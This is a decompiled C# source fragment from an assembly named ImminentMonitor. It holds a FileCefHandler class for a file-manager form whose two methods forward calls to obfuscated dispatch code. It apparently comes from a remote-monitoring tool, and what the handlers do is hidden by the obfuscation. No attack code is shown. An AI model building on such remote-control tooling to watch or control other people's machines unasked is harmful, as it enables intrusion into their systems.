// Decompiled with JetBrains decompiler
// Type: ImminentMonitor.Cef.FileCefHandler
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

namespace ImminentMonitor.Cef
{
  public class FileCefHandler
  {
    public FormFileManager FileManager;

    public FileCefHandler(FormFileManager fileManager) => this.FileManager = fileManager;

    public void handleTab(string id)
    {
      object[] object_3 = new object[2]
      {
        (object) this,
        (object) id
      };
      Class86.smethod_0().method_68(Class86.smethod_1(), "aJ+i]Pa.Q$", object_3);
    }

    private void ShowCommand(int index)
    {
      object[] object_3 = new object[2]
      {
        (object) this,
        (object) index
      };
      Class86.smethod_0().method_68(Class86.smethod_1(), "A#kcVPa.Q$", object_3);
    }
  }
}
